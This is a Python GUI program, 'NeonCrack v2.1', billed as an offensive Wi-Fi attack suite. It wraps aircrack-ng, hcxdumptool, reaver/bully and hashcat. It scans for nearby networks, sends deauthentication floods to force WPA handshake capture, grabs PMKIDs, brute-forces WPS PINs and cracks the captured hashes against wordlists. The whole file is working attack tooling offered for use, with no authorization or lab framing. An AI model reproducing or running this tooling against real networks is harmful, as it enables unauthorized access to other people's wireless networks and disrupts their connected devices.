#!/usr/bin/env python3
"""
NeonCrack v2.1 – Full‑Stack WPA/PMKID/WPS Attack Suite
Cyberpunk Wi‑Fi offensive toolkit inspired by Wifite2.
Created by Null_Lyfe — “Stay hidden.  Strike silently.”
Dependencies: aircrack-ng hcxdumptool hcxtools hashcat reaver bully hashid
"""


import os, subprocess, threading, csv, time, signal, shutil, re
from datetime import datetime
from tkinter import *
from tkinter import ttk, filedialog, scrolledtext, messagebox

accent, neon, bgcolor = "#ff0080", "#00f0ff", "#0f0f23"
font_main = ("Courier", 11)
CAP_DIR = "neoncrack_captures"
POTFILE = os.path.expanduser("~/.hashcat/hashcat.potfile")
os.makedirs(CAP_DIR, exist_ok=True)

root = Tk(); root.title("NeonCrack v2.1"); root.configure(bg=bgcolor); root.geometry("1100x770")

selected_iface, selected_target = StringVar(), StringVar()
scan_duration, pcap_file, wordlist_file = IntVar(value=45), StringVar(), StringVar()
hash_input = StringVar()
network_list, attack_proc = [], None


def run_cmd(cmd, outfile=None):
    return subprocess.Popen(cmd, stdout=open(outfile,"wb") if outfile else subprocess.PIPE,
                            stderr=subprocess.STDOUT, preexec_fn=os.setsid, text=True)

def log(widget, txt): widget.insert(END, txt + "\n"); widget.see(END); root.update()


def list_interfaces():
    out = subprocess.check_output(["iw","dev"]).decode()
    return [line.split()[1] for line in out.splitlines() if line.strip().startswith("Interface")]
def monitor_mode(iface, enable=True):
    run_cmd(["airmon-ng", "start" if enable else "stop", iface]).wait()


def parse_scan(csv_path):
    with open(csv_path, newline='') as f:
        return [(r[0].strip(), r[3].strip(), r[13].strip(), r[5].strip())
                for r in csv.reader(f) if len(r)>13 and r[0] not in ('BSSID','')]


def scan_networks():
    iface = selected_iface.get()
    if not iface:
        messagebox.showwarning("Interface", "Choose wireless interface first"); return
    monitor_mode(iface, True)
    log(scan_out, f"[*] Scanning on {iface} …")
    prefix = os.path.join(CAP_DIR, f"scan_{int(time.time())}")
    proc = run_cmd(["airodump-ng","-w",prefix,"--output-format","csv",iface])
    time.sleep(scan_duration.get()); proc.terminate(); time.sleep(2)
    csvp = f"{prefix}-01.csv"
    if not os.path.isfile(csvp): log(scan_out,"[!] CSV not found"); return
    global network_list; network_list = parse_scan(csvp)
    targets['menu'].delete(0,'end')
    for bssid,ch,essid,enc in network_list:
        line = f"{essid} | {bssid} | ch {ch} | {enc}"
        targets['menu'].add_command(label=line, command=lambda v=line: selected_target.set(v))
    log(scan_out, f"[+] Found {len(network_list)} networks"); monitor_mode(iface, False)


def extract_target():
    if not selected_target.get():
        messagebox.showwarning("Target", "Select a target network"); return None
    essid,bssid,ch,_ = [x.strip() for x in selected_target.get().split('|')]
    ch = ch.split()[1]; return bssid, ch, essid


def start_pmkid():
    target = extract_target(); iface=selected_iface.get()
    if not target: return
    bssid,ch,essid = target; monitor_mode(iface, True)
    outfile = os.path.join(CAP_DIR,f"pmkid_{essid}_{int(time.time())}.pcapng")
    global attack_proc; attack_proc = run_cmd(["hcxdumptool","-i",iface,"--filterlist_ap",bssid,"--enable_status=1"], outfile)
    log(att_out, f"[*] PMKID attack running → {outfile}")


def start_handshake():
    target = extract_target(); iface=selected_iface.get()
    if not target: return
    bssid,ch,essid = target; monitor_mode(iface, True)
    prefix = os.path.join(CAP_DIR,f"hs_{essid}_{int(time.time())}")
    global attack_proc; attack_proc = run_cmd(["airodump-ng","-c",ch,"--bssid",bssid,"-w",prefix,iface])
    run_cmd(["aireplay-ng","-0","10","-a",bssid,iface]).wait()
    log(att_out, f"[*] Handshake capture running → {prefix}-01.cap")


def start_wps():
    target = extract_target(); iface=selected_iface.get()
    if not target: return
    bssid,ch,essid = target; monitor_mode(iface, True)
    tool = "reaver" if shutil.which("reaver") else "bully"
    cmd = ["reaver","-i",iface,"-b",bssid,"-c",ch,"-vv"] if tool=="reaver" else ["bully","-b",bssid,"-c",ch,iface]
    global attack_proc; attack_proc = run_cmd(cmd, os.path.join(CAP_DIR,f"wps_{essid}_{int(time.time())}.log"))
    log(att_out, f"[*] WPS {tool} attack started.")


def stop_attack():
    global attack_proc
    if attack_proc:
        os.killpg(os.getpgid(attack_proc.pid), signal.SIGTERM)
        attack_proc=None
        monitor_mode(selected_iface.get(), False)
        log(att_out,"[!] Attack stopped.")


def run_crack():
    cap, wl = pcap_file.get(), wordlist_file.get()
    if not (cap and wl): messagebox.showwarning("Missing","Select capture & wordlist"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        new = os.path.join(CAP_DIR,f"converted_{int(time.time())}.hccapx")
        run_cmd(["hcxpcapngtool","-o",new,cap]).wait(); cap=new
    run_cmd(["hashcat","-m","22000",cap,wl,"--force","--status","--status-timer","30"])


# ---- Hash Identifier ----
def identify_hash():
    h = hash_input.get().strip()
    hash_res.delete('1.0',END)
    if not h:
        messagebox.showinfo("Hash", "Enter hash value"); return
    if shutil.which("hashid"):
        proc = run_cmd(["hashid","-m",h])
        out,_ = proc.communicate()
        hash_res.insert(END, out)
    else:
        # Quick heuristic fallback
        size=len(h)
        if re.match(r'^[a-f0-9]{32}$',h.lower()):
            hash_res.insert(END,"MD5 (32 hex chars)\n")
        elif size==40:
            hash_res.insert(END,"SHA1 (40 hex chars)\n")
        elif size==64:
            hash_res.insert(END,"SHA256 (64 hex chars)\n")
        else:
            hash_res.insert(END,"Unknown — install hashid for detailed info\n")


# ---- Cleaner ----
def clean_capture():
    cap = filedialog.askopenfilename(title="Select capture", filetypes=[("PCAP/PCAPNG","*.cap *.pcap *.pcapng")])
    if not cap: return
    out = os.path.join(CAP_DIR,f"clean_{os.path.basename(cap)}.pcapng")
    run_cmd(["hcxpcapngtool","-o",out,"--cleanall",cap]).wait()
    messagebox.showinfo("Cleaner",f"Cleaned capture saved → {out}")


# ---- Stats ----
def show_stats():
    stats_out.delete('1.0',END)
    if not os.path.isfile(POTFILE):
        stats_out.insert(END,"Potfile not found – run hashcat first\n"); return
    cracked = {}
    with open(POTFILE) as f:
        for line in f:
            _hash, pwd = line.strip().split(':',1)
            cracked.setdefault(len(pwd),0)
            cracked[len(pwd)]+=1
    stats_out.insert(END,"Cracked password length distribution:\n")
    for length,count in sorted(cracked.items()):
        stats_out.insert(END,f" length {length}: {count}\n")


# ===== GUI =====
style=ttk.Style(); style.theme_use("alt")
style.configure("TNotebook.Tab",background="#1a1a1a",foreground=neon,font=font_main,padding=8)

nb=ttk.Notebook(root); nb.pack(fill=BOTH,expand=True)
tabs = {}
for name in ("⚡ Scan","⚔️ Attacks","💥 Crack","🔎 Hash ID","🧹 Cleaner","📊 Stats"):
    frame=Frame(nb,bg=bgcolor); nb.add(frame,text=name); tabs[name]=frame
tab_s=tabs["⚡ Scan"]; tab_a=tabs["⚔️ Attacks"]; tab_c=tabs["💥 Crack"]; tab_h=tabs["🔎 Hash ID"]; tab_cl=tabs["🧹 Cleaner"]; tab_st=tabs["📊 Stats"]


# Scan tab layout
OptionMenu(tab_s,selected_iface,*list_interfaces()).pack(pady=5)
Spinbox(tab_s,from_=15,to=120,textvariable=scan_duration,width=5).pack()
Button(tab_s,text="Start Scan",command=lambda:threading.Thread(target=scan_networks,daemon=True).start(),bg=accent,fg="white").pack(pady=5)
scan_out=scrolledtext.ScrolledText(tab_s,width=100,height=25,bg="#0d0d17",fg=neon); scan_out.pack()


# Attack tab layout
targets=OptionMenu(tab_a,selected_target,""); targets.pack(pady=5,fill=X)
Button(tab_a,text="PMKID",command=lambda:threading.Thread(target=start_pmkid,daemon=True).start(),bg=accent,fg="white").pack(fill=X,padx=20,pady=2)
Button(tab_a,text="Handshake",command=lambda:threading.Thread(target=start_handshake,daemon=True).start(),bg=accent,fg="white").pack(fill=X,padx=20,pady=2)
Button(tab_a,text="WPS",command=lambda:threading.Thread(target=start_wps,daemon=True).start(),bg=accent,fg="white").pack(fill=X,padx=20,pady=2)
Button(tab_a,text="Stop",command=stop_attack,bg="#ff0030",fg="white").pack(fill=X,padx=20,pady=2)
att_out=scrolledtext.ScrolledText(tab_a,width=100,height=22,bg="#0d0d17",fg=neon); att_out.pack()


# Crack tab layout
Frame(tab_c,bg=bgcolor)
Entry(tab_c,textvariable=pcap_file,width=70).pack(pady=2)
Button(tab_c,text="Select capture",command=lambda:pcap_file.set(filedialog.askopenfilename())).pack()
Entry(tab_c,textvariable=wordlist_file,width=70).pack(pady=2)
Button(tab_c,text="Select wordlist",command=lambda:wordlist_file.set(filedialog.askopenfilename())).pack()
Button(tab_c,text="Start Crack",command=lambda:threading.Thread(target=run_crack,daemon=True).start(),bg=accent,fg="white").pack(pady=5)
crack_out=scrolledtext.ScrolledText(tab_c,width=100,height=22,bg="#0d0d17",fg=neon); crack_out.pack()


# Hash ID tab
Entry(tab_h,textvariable=hash_input,width=80).pack(pady=5)
Button(tab_h,text="Identify",command=identify_hash,bg=accent,fg="white").pack()
hash_res=scrolledtext.ScrolledText(tab_h,width=100,height=24,bg="#0d0d17",fg=neon); hash_res.pack()


# Cleaner tab
Button(tab_cl,text="Select & Clean Capture",command=clean_capture,bg=accent,fg="white").pack(pady=20)
Label(tab_cl,text="Cleaned files saved in neoncrack_captures",bg=bgcolor,fg=neon).pack()


# Stats tab
Button(tab_st,text="Refresh Stats",command=show_stats,bg=accent,fg="white").pack()
stats_out=scrolledtext.ScrolledText(tab_st,width=100,height=24,bg="#0d0d17",fg=neon); stats_out.pack()


root.mainloop()
